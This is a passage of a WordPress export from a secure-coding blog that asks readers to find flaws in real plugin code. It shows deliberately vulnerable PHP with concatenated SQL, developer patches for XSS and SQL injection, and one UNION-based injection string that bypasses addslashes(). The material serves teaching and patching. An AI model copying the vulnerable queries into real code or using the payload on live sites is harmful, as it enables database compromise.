-       &lt;input value="&lt;%= workgroup %&gt;"/&gt;
-       &lt;input value="&lt;%= chatID %&gt;" /&gt;
+       &lt;input type="hidden" name="workgroup" value="&lt;%= StringUtils.escapeHTMLTags(workgroup) %&gt;"/&gt;
+       &lt;input type="hidden" name="chatID" value="&lt;%= StringUtils.escapeHTMLTags(chatID) %&gt;" /&gt;
&lt;!-- End of Hidden Variable identifiers --&gt;
&lt;tr&gt;
&lt;td colspan="2" height="1%"&gt;
&lt;br/&gt;&lt;%=  welcomeText %&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td height="1%"&gt;
&lt;br/&gt;
&lt;/td&gt;
&lt;/tr&gt;

&lt;% if (authFailed) { %&gt;
&lt;tr valign="top"&gt;
&lt;td colspan="2" height="1%" nowrap&gt;&lt;span&gt;Authentication Failed&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;% } %&gt;

&lt;%
Iterator fields = workgroupForm.getFields();
while(fields.hasNext()){
hasElements = true;
FormField field = (FormField)fields.next();
String label = field.getLabel();
boolean required = field.isRequired();
String requiredStr = required ? "&amp;nbsp;&lt;span class=\"error\"&gt;*&lt;/span&gt;" : "";
if(!field.getType().equals(FormField.TYPE_HIDDEN)){
%&gt;
&lt;tr valign="top"&gt;
&lt;td height="1%" width="1%" nowrap&gt;&lt;%= label%&gt;&lt;%= requiredStr%&gt;&lt;/td&gt;&lt;td&gt;&lt;%= FormUtils.createAnswers

(field, request)%&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;% } } %&gt;

&lt;tr valign="top"&gt;
&lt;td height="1%"&gt;
&lt;!-- All workgroup defined variables --&gt;
&lt;%
fields = workgroupForm.getFields();
while(fields.hasNext()){
FormField field = (FormField)fields.next();
if(field.getType().equals(FormField.TYPE_HIDDEN)){
%&gt;
&lt;%= FormUtils.createDynamicField(field, request)%&gt;
&lt;% }} %&gt;
&lt;!-- End of Defined Variables --&gt;

&lt;% // Handle page location
if(location != null){ %&gt;
-                    &lt;input value="&lt;%= location%&gt;" /&gt;
+       &lt;input type="hidden" name="location" value="&lt;%= StringUtils.escapeHTMLTags(location)%&gt;" /&gt;
&lt;% } %&gt;
&lt;/td&gt;
&lt;td&gt; &lt;input value="&lt;%= startButton%&gt;"/&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;

&lt;/tr&gt;
&lt;/form&gt;
&lt;/table&gt;
-&lt;div style="position:absolute;bottom:0px;right:5px"&gt;&lt;img src="getimage?image=poweredby&amp;workgroup=&lt;%= workgroup %&gt;"/&gt;&lt;/div&gt;
+&lt;div style="position:absolute;bottom:0px;right:5px"&gt;&lt;img src="getimage?image=poweredby&amp;workgroup=&lt;%=

StringUtils.URLEncode(workgroup, "utf-8") %&gt;"/&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;%if(!hasElements){ %&gt;
&lt;script&gt;
document.f.submit();
&lt;/script&gt;
&lt;%}%&gt;
&lt;/html&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>906</wp:post_id>
		<wp:post_date>2010-06-18 08:00:10</wp:post_date>
		<wp:post_date_gmt>2010-06-18 15:00:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>renting-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="openfire"><![CDATA[Openfire]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[7050ff1e0b730f98bcb57166f8acaf28]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aRjI0b]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Renting - Cross Site Scripting]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Renting - Cross Site Scripting]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[renting-cross-site-scripting-2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Will</title>
		<link>http://spotthevuln.com/2010/06/will/</link>
		<pubDate>Mon, 21 Jun 2010 15:00:06 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=911</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Where is your will to be weird?
- Jim Morrison</strong></blockquote>
[ccnLe_php]

&lt;?php
/*
* This function removes the category identified by $categoryId from the post identified by $postId
*/
include_once('wpcm-options.php');

if( ! class_exists('wpcm_functions')) :

class wpcm_functions
{
        public static function remove_category($postId, $categoryId)
        {
                global $wpdb;
                $wpdb-&gt;show_errors();
                $queryStr = "DELETE FROM $wpdb-&gt;term_relationships
                          where object_id = $postId and term_taxonomy_id= $categoryId";

                $wpdb-&gt;query($queryStr);
        }

        /*
         * This function returns a list of posts that belong to a category identified by $category.
         * The optional Page parameter defines how many pages of posts to return
         */
        public static function get_posts($category, $page)
        {
                global $wpdb;
                $wpdb-&gt;show_errors();

                // First figure out how many posts to show per page. This will be your limit
                $pageSize = wpcm_options::get_option('postsperpage');

                $finalQueryLine = '';

                if($pageSize != -1)
                {
                        // Next figure out how many posts to skip. This will be your offset
                        $offset = $pageSize * $page;

                        $finalQueryLine = "limit " . $pageSize . " offset " . $offset;

                }

                $querystr = "select wposts.*, wp_term_taxonomy.term_taxonomy_id
                                 from $wpdb-&gt;posts wposts
                                  LEFT JOIN $wpdb-&gt;term_relationships wp_term_relationships ON wposts.ID = wp_term_relationships.object_id
                                  LEFT JOIN $wpdb-&gt;term_taxonomy wp_term_taxonomy ON wp_term_relationships.term_taxonomy_id = wp_term_taxonomy.term_taxonomy_id
                                  LEFT JOIN $wpdb-&gt;terms wp_terms ON wp_terms.term_id = wp_term_taxonomy.term_id
                                                WHERE wp_term_taxonomy.taxonomy = 'category'
                                                                and wp_terms.name = '" . $category . "'
                                                                and wposts.post_status='publish'
                                        ORDER BY wposts.ID " . $finalQueryLine;
                 $postlist = $wpdb-&gt;get_results($querystr);
                 return $postlist;
        }

        public static function get_postCount($category)
        {
                global $wpdb;
                $wpdb-&gt;show_errors();
              
                $querystr = "select count(*)
                                 from $wpdb-&gt;posts wposts
                                  LEFT JOIN $wpdb-&gt;term_relationships wp_term_relationships ON wposts.ID = wp_term_relationships.object_id
                                  LEFT JOIN $wpdb-&gt;term_taxonomy wp_term_taxonomy ON wp_term_relationships.term_taxonomy_id = wp_term_taxonomy.term_taxonomy_id
                                  LEFT JOIN $wpdb-&gt;terms wp_terms ON wp_terms.term_id = wp_term_taxonomy.term_id
                                                WHERE wp_term_taxonomy.taxonomy = 'category'
                                                                and wp_terms.name = '" . $category . "'
                                                                and wposts.post_status='publish'";

                $result = $wpdb-&gt;get_var($querystr, 0, 0);
                return $result;

        }

        public static function render_posts($postlist)
        {
                if($postlist)
                {
                         foreach($postlist as $post)
                         {
                                echo '&lt;div&gt;';
                                echo '&lt;span &gt;&lt;a href="'. get_permalink($post-&gt;ID) .'" title="'.$post-&gt;post_title . '"&gt;' . $post-&gt;post_title . '&lt;/a&gt;&lt;/span&gt;&lt;span &gt;' . date_format(date_create($post-&gt;post_date), "F j, Y") . '&lt;/span&gt;';
                                echo '&lt;p &gt;&lt;a href="javascript:void(0);" postID="'.$post-&gt;ID.'" catID="'. $post-&gt;term_taxonomy_id  .'" title="Remove post from this category"&gt;Remove&lt;/a&gt; | ';
                                echo edit_post_link('Edit Post', '', '', $post-&gt;ID);
                                echo '&lt;/p&gt;&lt;/div&gt;';
                         }
                }
                else
                {
                        echo '&lt;strong&gt;No posts found&lt;/strong&gt;';
                }
        }

        public static function render_postcount($category)
        {
                $count = wpcm_functions::get_postCount($category);

                echo '&lt;span&gt;'.$count.'&lt;/span&gt;';
        }

        public static function get_categories()
        {
                global $wpdb;

                $wpdb-&gt;show_errors();

                $querystr = "select wt.name, wt.term_id
                                          from $wpdb-&gt;terms wt
                                          join $wpdb-&gt;term_taxonomy wtt on wtt.term_id = wt.term_id
                                          where wtt.taxonomy = 'category'
                                          order by wt.name";
                $catlist = $wpdb-&gt;get_results($querystr);
                return $catlist;
        }
}
endif;

?&gt;

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>911</wp:post_id>
		<wp:post_date>2010-06-21 08:00:06</wp:post_date>
		<wp:post_date_gmt>2010-06-21 15:00:06</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>will</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[a720ebdb6e071ed5d93b2f313edc62a9]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cIla2U]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>534</wp:comment_id>
			<wp:comment_author><![CDATA[Vulnerable Source Code &#8211; Will &#8211; Sql Injection ~ SpotTheVuln.com &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/06/will-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-06-25 09:59:56</wp:comment_date>
			<wp:comment_date_gmt>2010-06-25 16:59:56</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Will [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Will – Sql Injection</title>
		<link>http://spotthevuln.com/2010/06/will-sql-injection/</link>
		<pubDate>Fri, 25 Jun 2010 15:00:00 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=915</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WP Category Manager plugin

Fixed in Version: 1.3.1.0

Issue Type: Sql Injection

Original Code: <a title="Will" href="http://spotthevuln.com/2010/06/will/" target="_blank">Found  Here</a>
<h2>Description</h2>
This week’s vulnerability affected the WP Category Manager plugin.  There were two interesting characteristics I noticed with this code fix.  First, while there were a number of SQL injection vulnerabilities fixed with this change list, there were also a large number of non security fixes included in this change list as well.  It’s generally a good idea to keep security change lists separate from other change lists.  The number of non security fixes included in this particular list was so distracting, I removed them from the post.  The SQL injection fixes are pretty straight forward, changing dynamically built SQL statements into WordPress’ built-in $wpdb-&gt;prepare() function.

The second characteristic that caught my attention was usage of numeric IDs at the end of SQL statements.  For example:
<blockquote>where object_id = $postId and<span style="color: #ff0000;"> term_taxonomy_id= $categoryId";</span></blockquote>
This syntax creates a condition in which the typical addslashes() used to protect against SQL injection can be bypassed.  For example, an attacker could craft a SQL injection string like:
<blockquote>Sqli.php?categoryId=-1 union select 1,2,3,4,5--</blockquote>
As you can see, the injection string above contains no special characters that would be escaped by addslashes().  Fortunately, the Category Manager plugin developers chose to utilze $wpdb-&gt;prepare() instead of addslashes().
<h2>Developers Solution</h2>
[cce lang="diff"]&lt;?php
/*
* This function removes the category identified by $categoryId from the post identified by $postId
*/
include_once('wpcm-options.php');

if( ! class_exists('wpcm_functions')) :

class wpcm_functions
{
public static function remove_category($postId, $categoryId)
{
-               global $wpdb;
-               $wpdb-&gt;show_errors();
-               $queryStr = "DELETE FROM $wpdb-&gt;term_relationships
-                         where object_id = $postId and term_taxonomy_id= $categoryId";
+        echo $postId;

-               $wpdb-&gt;query($queryStr);
+        if(is_int(intval($postId)))
+        {
+            global $wpdb;
+
+            $wpdb-&gt;show_errors();
+
+            $queryStr = $wpdb-&gt;prepare("DELETE FROM $wpdb-&gt;term_relationships where object_id = %d and term_taxonomy_id= %s", $postId, $categoryId);
+            $wpdb-&gt;query($queryStr);
+        }
}

/*
* This function returns a list of posts that belong to a category identified by $category.
* The optional Page parameter defines how many pages of posts to return
*/
public static function get_posts($category, $page)
{
global $wpdb;
$wpdb-&gt;show_errors();

// First figure out how many posts to show per page. This will be your limit
$pageSize = wpcm_options::get_option('postsperpage');

$finalQueryLine = '';

if($pageSize != -1)
{
// Next figure out how many posts to skip. This will be your offset
$offset = $pageSize * $page;

$finalQueryLine = "limit " . $pageSize . " offset " . $offset;

+                    }
+
+            $querystr = $wpdb-&gt;prepare("select wposts.*, wp_term_taxonomy.term_taxonomy_id
+                                    from $wpdb-&gt;posts wposts
+                                    LEFT JOIN $wpdb-&gt;term_relationships wp_term_relationships ON wposts.ID = wp_term_relationships.object_id
+                                    LEFT JOIN $wpdb-&gt;term_taxonomy wp_term_taxonomy ON wp_term_relationships.term_taxonomy_id = wp_term_taxonomy.term_taxonomy_id
+                                    LEFT JOIN $wpdb-&gt;terms wp_terms ON wp_terms.term_id = wp_term_taxonomy.term_id
+                                        WHERE wp_term_taxonomy.taxonomy = 'category'
+                                            and wp_terms.name = '%s'
+                                            and wposts.post_status='publish'
+                                        ORDER BY wposts.ID " . $finalQueryLine , $category);
+
+            $postlist = $wpdb-&gt;get_results($querystr);
+            return $postlist;
}
-               $querystr = "select wposts.*, wp_term_taxonomy.term_taxonomy_id
-                                from $wpdb-&gt;posts wposts
-                                 LEFT JOIN $wpdb-&gt;term_relationships wp_term_relationships ON wposts.ID = wp_term_relationships.object_id
-                                 LEFT JOIN $wpdb-&gt;term_taxonomy wp_term_taxonomy ON wp_term_relationships.term_taxonomy_id = wp_term_taxonomy.term_taxonomy_id
-                                 LEFT JOIN $wpdb-&gt;terms wp_terms ON wp_terms.term_id = wp_term_taxonomy.term_id
-                                               WHERE wp_term_taxonomy.taxonomy = 'category'
-                                                               and wp_terms.name = '" . $category . "'
-                                                               and wposts.post_status='publish'
-                                       ORDER BY wposts.ID " . $finalQueryLine;
-
-                $postlist = $wpdb-&gt;get_results($querystr);
-                return $postlist;
}

public static function get_postCount($category)
{
global $wpdb;
$wpdb-&gt;show_errors();

-               $querystr = "select count(*)
-                                from $wpdb-&gt;posts wposts
-                                 LEFT JOIN $wpdb-&gt;term_relationships wp_term_relationships ON wposts.ID = wp_term_relationships.object_id
-                                 LEFT JOIN $wpdb-&gt;term_taxonomy wp_term_taxonomy ON wp_term_relationships.term_taxonomy_id = wp_term_taxonomy.term_taxonomy_id
-                                 LEFT JOIN $wpdb-&gt;terms wp_terms ON wp_terms.term_id = wp_term_taxonomy.term_id
-                                               WHERE wp_term_taxonomy.taxonomy = 'category'
-                                                               and wp_terms.name = '" . $category . "'
-                                                               and wposts.post_status='publish'";
+        $querystr = $wpdb-&gt;prepare("select count(*)
+                                from $wpdb-&gt;posts wposts
+                                    LEFT JOIN $wpdb-&gt;term_relationships wp_term_relationships ON wposts.ID = wp_term_relationships.object_id
+                                    LEFT JOIN $wpdb-&gt;term_taxonomy wp_term_taxonomy ON wp_term_relationships.term_taxonomy_id = wp_term_taxonomy.term_taxonomy_id
+                                    LEFT JOIN $wpdb-&gt;terms wp_terms ON wp_terms.term_id = wp_term_taxonomy.term_id
+                                        WHERE wp_term_taxonomy.taxonomy = 'category'
+                                            and wp_terms.name = '%s'
+                                            and wposts.post_status='publish'" , $category);

$result = $wpdb-&gt;get_var($querystr, 0, 0);
return $result;

}

public static function render_posts($postlist)
{
if($postlist)
{
foreach($postlist as $post)
{
echo '&lt;div id="catmanagerpost'. $post-&gt;ID .'"&gt;';
echo '&lt;span &gt;&lt;a href="'. get_permalink($post-&gt;ID) .'" title="'.$post-&gt;post_title . '"&gt;' . $post-&gt;post_title . '&lt;/a&gt;&lt;/span&gt;&lt;span &gt;' . date_format(date_create($post-&gt;post_date), "F j, Y") . '&lt;/span&gt;';
echo '&lt;p &gt;&lt;a href="javascript:void(0);" postID="'.$post-&gt;ID.'" catID="'. $post-&gt;term_taxonomy_id  .'" id="catmanremovepost'. $post-&gt;ID .'" title="Remove post from this category"&gt;Remove&lt;/a&gt; | ';
echo edit_post_link('Edit Post', '', '', $post-&gt;ID);
echo '&lt;/p&gt;&lt;/div&gt;';
}
}
else
{
echo '&lt;strong&gt;No posts found&lt;/strong&gt;';
}
}

public static function render_postcount($category)
{
$count = wpcm_functions::get_postCount($category);

echo '&lt;span id="wpcmpostcount"&gt;'.$count.'&lt;/span&gt;';
}

public static function get_categories()
{
global $wpdb;

$wpdb-&gt;show_errors();

$querystr = "select wt.name, wt.term_id
from $wpdb-&gt;terms wt
join $wpdb-&gt;term_taxonomy wtt on wtt.term_id = wt.term_id
where wtt.taxonomy = 'category'
order by wt.name";

$catlist = $wpdb-&gt;get_results($querystr);
return $catlist;
}
}
endif;

?&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>915</wp:post_id>
		<wp:post_date>2010-06-25 08:00:00</wp:post_date>
		<wp:post_date_gmt>2010-06-25 15:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>will-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="addslashes"><![CDATA[addslashes]]></category>
		<category domain="post_tag" nicename="all-vulnerabilities"><![CDATA[All Vulnerabilities]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="post_tag" nicename="category-manager"><![CDATA[category manager]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="plugin-developers"><![CDATA[plugin developers]]></category>
		<category domain="post_tag" nicename="plugins"><![CDATA[plugins]]></category>
		<category domain="post_tag" nicename="security-fixes"><![CDATA[security fixes]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-statements"><![CDATA[sql statements]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[b2de1186b8c7608cc1d20ba431d04bca]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/c3bWAN]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Will - Sql Injection]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Will - Sql Injection]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Watched</title>
		<link>http://spotthevuln.com/2010/06/watched/</link>
		<pubDate>Mon, 28 Jun 2010 16:00:54 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=921</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>You don't know when you're being watched. That's one of the weird things about celebrity. It's my least favorite part of acting, celebrity.
-Denzel Washington</strong></blockquote>
[ccnLe_php]

&lt;?php
function qtrans_convertURL($url='', $lang='', $forceadmin = false) {
 global $q_config;
 
 // invalid language
 if($url=='') $url = clean_url($q_config['url_info']['url']);
 if($lang=='') $lang = $q_config['language'];
 if(defined('WP_ADMIN')&amp;&amp;!$forceadmin) return $url;
 if(!qtrans_isEnabled($lang)) return "";
 
 // &amp; workaround
 $url = str_replace('&amp;amp;','&amp;',$url);
 $url = str_replace('&amp;#038;','&amp;',$url);
 
 // check if it's an external link
 $urlinfo = qtrans_parseURL($url);
 $home = rtrim(get_option('home'),"/");
 if($urlinfo['host']!='') {
  // check for already existing pre-domain language information
  if($q_config['url_mode'] == QT_URL_DOMAIN &amp;&amp; preg_match("#^([a-z]{2}).#i",$urlinfo['host'],$match)) {
   if(qtrans_isEnabled($match[1])) {
    // found language information, remove it
    $url = preg_replace("/".$match[1]."\./i","",$url, 1);
    // reparse url
    $urlinfo = qtrans_parseURL($url);
   }
  }
  if(substr($url,0,strlen($home))!=$home) {
   return $url;
  }
  // strip home path
  $url = substr($url,strlen($home));
 } else {
  // relative url, strip home path
  $homeinfo = qtrans_parseURL($home);
  if($homeinfo['path']==substr($url,0,strlen($homeinfo['path']))) {
   $url = substr($url,strlen($homeinfo['path']));
  }
 }
 
 // check for query language information and remove if found
 if(preg_match("#(&amp;|\?)lang=([^&amp;\#]+)#i",$url,$match) &amp;&amp; qtrans_isEnabled($match[2])) {
  $url = preg_replace("#(&amp;|\?)lang=".$match[2]."&amp;?#i","$1",$url);
 }
 
 // remove any slashes out front
 $url = ltrim($url,"/");
 
 // remove any useless trailing characters
 $url = rtrim($url,"?&amp;");
 
 // reparse url without home path
 $urlinfo = qtrans_parseURL($url);
 
 // check if its a link to an ignored file type
 $ignore_file_types = preg_split('/\s*,\s*/',strtolower($q_config['ignore_file_types']));
 $pathinfo = pathinfo($urlinfo['path']);
 if(isset($pathinfo['extension']) &amp;&amp; in_array(strtolower($pathinfo['extension']), $ignore_file_types)) {
  return $home."/".$url;
 }
 
 switch($q_config['url_mode']) {
  case QT_URL_PATH: // pre url
   // might already have language information
   if(preg_match("#^([a-z]{2})/#i",$url,$match)) {
    if(qtrans_isEnabled ($match[1])) {
     // found language information, remove it
     $url = substr($url, 3);
    }
   }
   if($lang!=$q_config['default_language']) $url = $lang."/".$url;
   break;
  case QT_URL_DOMAIN: // pre domain
   if($lang!=$q_config['default_language']) $home = preg_replace("#//#","//".$lang.".",$home,1);
   break;
  default: // query
   if($lang!=$q_config['default_language']){
    if(strpos($url,'?')===false) {
     $url .= '?';
    } else {
     $url .= '&amp;';
    }
    $url .= "lang=".$lang;
   }
 }
 
 // see if cookies are activated
 if(!$q_config['cookie_enabled'] &amp;&amp; !$q_config['url_info']['internal_referer'] &amp;&amp; $urlinfo['path'] == '' &amp;&amp; $lang == $q_config['default_language'] &amp;&amp; $q_config

['language'] != $q_config['default_language']) {
  // :( now we have to make unpretty URLs
  $url = preg_replace("#(&amp;|\?)lang=".$match[2]."&amp;?#i","$1",$url);
  if(strpos($url,'?')===false) {
   $url .= '?';
  } else {
   $url .= '&amp;';
  }
  $url .= "lang=".$lang;
 }
 
 // &amp;amp; workaround
 $complete = str_replace('&amp;','&amp;amp;',$home."/".$url);
 return $complete;
}

...&lt;SNIP...

function qtrans_use($lang, $text, $show_available=false) {
        global $q_config;
        // return full string if language is not enabled
        if(!qtrans_isEnabled($lang)) return $text;
        if(is_array($text)) {
                // handle arrays recursively
                foreach($text as $key =&gt; $t) {
                        $text[$key] = qtrans_use($lang,$text[$key],$show_available);
                }
                return $text;
        }
        
        if(is_object($text)) {
                foreach(get_object_vars($text) as $key =&gt; $t) {
                        $text-&gt;$key = qtrans_use($lang,$text-&gt;$key,$show_available);
                }
                return $text;
        }
        
        // get content
        $content = qtrans_split($text);
        // find available languages
        $available_languages = array();
        foreach($content as $language =&gt; $lang_text) {
                $lang_text = trim($lang_text);
                if(!empty($lang_text)) $available_languages[] = $language;
        }
        
        // if no languages available show full text
        if(sizeof($available_languages)==0) return $text;
        // if content is available show the content in the requested language
        $content[$lang] = trim($content[$lang]);
        if(!empty($content[$lang])) {
                return $content[$lang];
        }
        // content not available in requested language (bad!!) what now?
        if(!$show_available){
